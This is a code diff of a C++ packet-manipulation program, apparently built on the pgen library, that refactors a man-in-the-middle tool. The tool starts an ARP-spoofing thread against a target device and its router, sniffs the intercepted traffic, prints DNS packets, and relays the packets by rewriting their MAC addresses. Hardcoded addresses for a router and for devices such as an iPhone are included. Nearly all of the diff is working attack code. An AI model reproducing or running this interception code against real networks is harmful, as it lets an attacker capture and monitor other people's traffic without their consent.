@@ -11,61 +11,72 @@
 const char* dev = "wlan1";
 const char* myip = "192.168.179.8";
 
-/* buffalo router */
-//const char* router_ip = "192.168.222.1";
-//const char* router_mac = "74:03:bd:13:2c:a6";
+struct host{
+	char ip[32];
+	char mac[32];
+};
+
 
 /* nad11 mobile router */
-const char* router_ip = "192.168.179.1";
-const char* router_mac = "a2:12:42:17:d8:8f";
+struct host router = {"192.168.179.1", "a2:12:42:17:d8:8f"};
+
+/* buffalo router */
+//struct host router = {"192.168.222.1", "74:03:bd:13:2c:a6"};
+
+/* kaplan router */
+//struct host router = {"10.128.4.1", "00:00:0c:07:ac:01"};
 
 /* iphone */
-const char* target_ip = "192.168.179.4";
-const char* target_mac = "f0:24:75:bf:8d:bf";
+//struct host target = {"192.168.179.4", "f0:24:75:bf:8d:bf"};
 
 /* buffalo usb ethernetl */
-//const char* target_ip = "192.168.222.106";
-//const char* target_mac = "80:e6:50:17:18:46";
+//struct host target = {"192.168.222.103", "cc:e1:d5:02:ea:71"};
 
 /* mac wlan en0 */
-//const char* target_ip = "192.168.222.103";
-//const char* target_mac = "cc:e1:d5:02:ea:71";
+//struct host target = {"192.168.222.106", "10.128.5.85"};
+struct host target = {"192.168.179.5", "80:e6:50:17:18:46"};
+
 
 
 pgen_t* handle;
 void mitm_attack(const char* ip1, const char* mac1, 
 					const char* ip2, const char* mac2);
-bool filter(const u_char* packet, int len);
+bool other_packet_filter(const u_char* packet, int len);
 
 
 
-void filter_dns(const u_char* packet, int len){
+void filter(const u_char* packet, int len){
 	pgen_unknown buf(packet, len);
-	if(buf.isUDP && buf.portis(53)){
-		pgen_dns dns(packet, len);
-		if(dns.DNS.flags.qr==1){
-			dns.summary();	
-		}
-	}
+
+	if(!(buf.isUDP && buf.portis(53))) return;
+
+	pgen_dns dns(packet, len);
+	dns.info();
+	printf("\n\n");
 }
 
 
+
 bool myswitch(const u_char* packet, int len){
-	if(filter(packet, len) == false) return true;
+	if(other_packet_filter(packet, len) == false) return true;
 	
-	filter_dns(packet, len);
+	filter(packet, len);
 
 	macaddr next_src;
 	macaddr next_dst;
 	next_src.setmacbydev(dev);
 	pgen_ip ip(packet, len);
 	
-	if(ip.IP.dst == target_ip)	next_dst = target_mac;
-	else						next_dst = router_mac;
+	if(ip.IP.dst == target.ip)	next_dst = target.mac;
+	else						next_dst = router.mac;
 	ip.ETH.src = next_src;
 	ip.ETH.dst = next_dst;
+
 	
-	ip.send_handle(handle);
+
+	ip.send_handle(handle);	
+
+	
 	return true;
 }
 
@@ -79,13 +90,13 @@ int main(int argc, char** argv){
 		perror("pgen_open");
 		return -1;
 	}
-	std::thread mitm(mitm_attack, target_ip, target_mac, router_ip, router_mac);
+	std::thread mitm(mitm_attack, target.ip, target.mac, router.ip, router.mac);
 	sniff(handle, myswitch);
 }
 
 
 
-bool filter(const u_char* packet, int len){
+bool other_packet_filter(const u_char* packet, int len){
 	ipaddr myip;
 	myip.setipbydev(dev);
 
